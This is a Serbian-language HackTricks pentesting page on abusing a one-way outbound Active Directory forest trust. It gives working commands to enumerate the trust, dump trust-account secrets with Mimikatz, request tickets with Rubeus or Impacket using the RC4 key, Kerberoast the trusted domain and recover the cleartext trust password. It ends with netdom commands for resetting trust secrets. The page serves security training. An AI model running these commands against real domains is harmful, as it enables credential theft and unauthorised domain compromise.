# Eksterni forest domen - Jednosmerni (Outbound)

{{#include ../../banners/hacktricks-training.md}}

U ovom scenariju **vaš domen** **veruje** određenim **privilegijama** principalâ iz **drugog domena/foresta**.

## Enumeracija

### Outbound Trust
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
Ako vam je AD modul dostupan, pregledajte i **Trusted Domain Object (TDO)** direktno. Ovo vam daje neobrađene LDAP trust podatke koji će vam kasnije biti potrebni pri odlučivanju da li je lakši put **FSP/group abuse** ili **trust-account abuse**:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
Takođe bi trebalo da utvrdite gde je stranim principalima iz `CN=ForeignSecurityPrincipals` zapravo dodeljen pristup. Uobičajeni dobici su:

- **Local admin** na serveru/DC-u u vašem trenutnom domenu
- Članstvo u **custom domain group** koja ima ACL-ove nad korisnicima/računarima/GPO-ovima
- Prava za izmenu **computer objects**, koja kasnije mogu postati [RBCD](resource-based-constrained-delegation.md) ako konfiguracija trust-a to dozvoljava

## Attack trust naloga

Kada se kreira one-way trust iz domena/foresta **B** ka domenu/forestu **A** (**B trusts A**), u **A** se kreira **trust account** za **B**. U outbound-trust prikazu domena **A**, ovo je korisno zato što, ako kasnije kompromitujete **B** (stranu koja veruje), tamo možete dump-ovati trust secret i autentifikovati se nazad na **A** kao `B$`.<sup>[[1]](#references)</sup>

Ključni aspekt koji treba razumeti jeste da se password i Kerberos materijal za taj trust account mogu izvući sa Domain Controller-a u domenu koji veruje, pomoću:<sup>[[1]](#references)</sup>
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Ovo funkcioniše zato što je trust nalog kreiran u **trusted** domenu omogućen principal koji na kraju dobija osnovna prava običnog korisnika domena u njemu. To je često dovoljno za početak enumeracije LDAP-a, zahtevanje ticket-a i pronalaženje sledećeg puta za eskalaciju.<sup>[[1]](#references)</sup>

U scenariju u kojem je `ext.local` **trusting** domen, a `root.local` **trusted** domen, nalog pod nazivom `EXT$` kreira se unutar domena `root.local`. Dumpovanje trust ključeva iz domena `ext.local` otkriva kredencijale koji mogu da se koriste kao `root.local\EXT$` protiv domena `root.local`:<sup>[[1]](#references)</sup>
```bash
lsadump::trust /patch
```
Nakon toga, koristite izdvojeni **RC4** ključ da se autentifikujete kao `root.local\EXT$` unutar domena `root.local`:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Zatim izvršite enumeraciju domena od poverenja kao taj principal, na primer Kerberoasting-om visokovrednog SPN-a u `root.local`:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Iz Linux-a

Ako ste povratili ključ **RC4** trust naloga, ista ideja funkcioniše iz Linux-a koristeći Impacket:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
Ako **RC4** nije prihvaćen, pređite na pronađenu **lozinku u čistom tekstu** (ili izvedene **AES** ključeve) i ponovo koristite uobičajene [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) i [Kerberoast](kerberoast.md) tokove iz tog foothold-a.

### Zamke kod ključnog materijala

Ne mešajte **trust ključeve** i **trust-account kredencijale**:<sup>[[1]](#references)</sup>

- Kod jednosmernog trust-a, obe strane čuvaju **TDO**, ali stvarni **`EXT$` korisnički nalog postoji samo u trusted domenu**.
- Trenutna lozinka trust-account-a odražava se u trust secret-u TDO-a (`NewPassword` / trenutni trust ključ).
- **RC4** trust ključ je najlakši artifact za ponovnu upotrebu sa `asktgt` kao trust account; u podrazumevanim postavkama to je obično radni enctype, jer trust account često ima prazan `msDS-SupportedEncryptionTypes`.
- Ako razmišljate o **AES trust ključevima**, imajte na umu da oni nisu međusobno zamenljivi sa AES ključevima trust account-a, jer se salt-ovi razlikuju.

Zato za tehniku na ovoj stranici preferirajte ili izvučeni **RC4** materijal ili pronađenu **lozinku u čistom tekstu**.<sup>[[1]](#references)</sup>

### Prikupljanje lozinke u čistom tekstu

U prethodnom toku korišćen je trust hash umesto **lozinke u čistom tekstu** (koju takođe **dump-uje mimikatz**).<sup>[[1]](#references)</sup>

Lozinka u čistom tekstu može se dobiti konvertovanjem \[ CLEAR ] izlaza iz mimikatz-a iz heksadecimalnog formata i uklanjanjem null bajtova `\x00`:<sup>[[1]](#references)</sup>

![Trust Account Attack - Prikupljanje lozinke u čistom tekstu: Lozinka u čistom tekstu može se dobiti konvertovanjem izlaza ( CLEAR ) iz mimikatz-a iz heksadecimalnog formata i uklanjanjem null...](<../../images/image (938).png>)

Ponekad prilikom kreiranja trust relationship-a korisnik mora ručno da unese lozinku za trust. U ovoj demonstraciji ključ je originalna trust lozinka i zato je čitljiva ljudima. Kada se ključ rotira (podrazumevano: svakih 30 dana), lozinka u čistom tekstu obično više neće biti čitljiva ljudima, ali će tehnički i dalje moći da se koristi.<sup>[[1]](#references)</sup>

Lozinka u čistom tekstu može se koristiti za obavljanje regularne autentikacije kao trust account, kao alternativa zahtevanju TGT-a pomoću Kerberos secret key-a trust account-a. Ovde se iz `ext.local` šalje upit ka `root.local` za članove grupe `Domain Admins`:<sup>[[1]](#references)</sup>

![Trust Account Attack - Prikupljanje lozinke u čistom tekstu: Lozinka u čistom tekstu može se koristiti za obavljanje regularne autentikacije kao trust account, kao alternativa zahtevanju TGT-a...](<../../images/image (792).png>)

### Praktična ograničenja

> [!WARNING]
> Trust account-i su nezgodni principal-i. Interactive logons kao što su **RUNAS / console / RDP** ovde nisu očekivani put, a pokušaji **NTLM** autentikacije mogu da ne uspeju sa `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. Umesto toga planirajte **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast).<sup>[[1]](#references)</sup>

### Napomena o persistence-u / čišćenju

Ako defenders shvate da je trusting domen kompromitovan, trebalo bi da rotiraju trust secret na **obe strane** pomoću `netdom trust ... /resetOneSide ...`. Iz perspektive operatora ovo je važno zato što **ručni reset odmah invalidira stari trust materijal**, dok regularna rotacija trust lozinke zadržava trenutne/prethodne vrednosti tokom rollover-a.<sup>[[2]](#references)</sup>
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## Reference

- [1] [SID filter kao bezbednosna granica između domena? (Deo 7) – Trust account attack – od trusting do trusted](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [2] [AD Forest Recovery – Resetting a trust password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
